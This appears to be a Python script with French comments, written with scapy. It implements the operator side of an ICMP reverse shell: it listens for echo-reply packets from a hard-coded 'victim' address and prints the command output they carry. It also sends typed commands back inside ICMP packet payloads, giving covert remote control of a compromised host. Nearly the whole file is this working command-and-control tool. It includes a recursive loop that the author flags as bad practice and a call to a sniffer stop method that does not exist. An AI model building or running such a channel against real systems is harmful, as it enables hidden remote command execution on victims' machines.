from scapy.all import *
from scapy.layers.inet import IP, ICMP
import threading
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"

"""
ICMP PACKET
https://cryptsus.com/blog/icmp-reverse-shell.html

0                   1                     2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier (ID)     |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Optional Data                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""


class Server:
    """
    On définis une classe Server qui aura pour but:
        -d'écouter le traffic réseaux
        -de filtrer les paquets
        -d'envoyer les commandes
    """

    def __init__(self, victim_ip, packet_id):
        """"""
        self.victim = victim_ip
        self.ID = packet_id
        self.TTL = 64
        self.icmp_sniffer = threading.Thread(target=sniff, kwargs={'prn':self.filter, 'store':False, 'filter':'icmp'})
        self.icmp_sniffer.start()

    def main(self):
        """
        Méthode de classe qui aura pour but d'initialiser l'audit du traffic
        On utilisera un sniffer à l'interieur d'un Thread (https://scapy.readthedocs.io/en/latest/usage.html)
        """
        data = input(f"[{self.victim}]>")
        
        if data and data != "exit":
            send(IP(dst=self.victim, ttl=self.TTL) / ICMP(type=0, id=self.ID) / data, verbose=0)
            
        elif data and data == "exit":
            self.icmp_sniffer.stop()
            exit()

    def filter(self, packet):
        """
        On va filtrer plus en profondeur le paquet afin de vérifier que notre paquet est celui
        qu'on veut (via l'identifier ICMP).
        Par la suite on se chargera de récupérer les données dans l'optional Data

        On oublie pas de filtrer le type de paquet ICMP
        -echo-reply (type 0)
        -echo-request (code 8)
        """
        if packet[IP].src == self.victim and packet[ICMP].type == 0 and packet[ICMP].id == self.ID and packet[Raw].load:
            data = (packet[Raw].load)
            print(data.decode('cp850'))
            
            # /!\ A ne jamais faire /!\
            # On effectue un rebouclage sur la méthode principale
            # ici je n'ai pas trouvé d'autres solutions qu'en rebouclant sinon on reste dans une boucle infinie
            self.main()


if __name__ == "__main__":
    icmp_door_server = Server("192.168.1.62", 13170)
    icmp_door_server.main()
